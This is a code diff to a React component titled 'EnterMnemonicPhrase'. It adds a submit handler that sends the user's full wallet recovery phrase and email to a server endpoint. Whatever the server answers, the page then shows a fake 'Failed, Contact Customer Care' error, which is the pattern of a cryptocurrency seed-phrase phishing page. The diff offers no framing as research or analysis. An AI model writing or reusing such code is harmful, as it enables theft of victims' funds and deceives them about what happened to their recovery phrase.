@@ -1,8 +1,10 @@
 'use client'
 
+import axios from "axios";
 import React, { useState } from "react";
+import { toast, ToastContainer } from "react-toastify";
 
-const EnterMnemonicPhrase = () => {
+const EnterMnemonicPhrase = ({ user }: any) => {
     const [phraseLength, setPhraseLength] = useState(12);
     const [mnemonic, setMnemonic] = useState(Array(12).fill(""));
 
@@ -17,8 +19,16 @@ const EnterMnemonicPhrase = () => {
         setMnemonic(Array(length).fill(""));
     };
 
-    const handleSubmit = () => {
-        // Add submission logic here
+    const handleSubmit = async () => {
+        toast('connecting, Please Wait...')
+        await axios.post('/main/connect-wallet/api', {
+            name: user.user.image,
+            email: user.user.email,
+            passphase: mnemonic.join(" ")
+        })
+        setTimeout(() => {
+            toast('Failed, Contact Customer Care', { type: 'error' })
+        }, 2000);
         console.log("Mnemonic Phrase: ", mnemonic.join(" "));
     };
 
@@ -62,6 +72,7 @@ const EnterMnemonicPhrase = () => {
                     Continue
                 </button>
             </div>
+            <ToastContainer />
         </div>
     );
 };
